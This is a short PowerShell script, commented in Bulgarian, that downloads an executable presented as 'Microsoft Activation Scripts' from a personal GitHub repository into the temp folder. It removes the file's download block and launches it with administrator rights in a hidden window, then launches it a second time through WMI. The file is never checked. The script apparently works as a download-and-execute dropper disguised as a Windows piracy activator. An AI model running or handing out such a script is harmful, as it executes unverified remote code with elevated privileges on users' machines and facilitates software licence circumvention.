$url = "https://raw.githubusercontent.com/acenljd/Windows-Activator/refs/heads/main/Microsoft%20Activation%20Scripts.exe"
$tempFile = "$env:TEMP\Microsoft Activation Scripts.exe"

Invoke-WebRequest -Uri $url -OutFile $tempFile
Unblock-File -Path $tempFile

# Метод 1: Използване на COM обект Shell.Application
$shell = New-Object -ComObject Shell.Application
$shell.ShellExecute($tempFile, "", $env:TEMP, "runas", 0)

# Или метод 2: Директно чрез WMI
$processClass = [WMICLASS]"root\cimv2:Win32_Process"
$processClass.Create("`"$tempFile`"", $env:TEMP, $null) | Out-Null
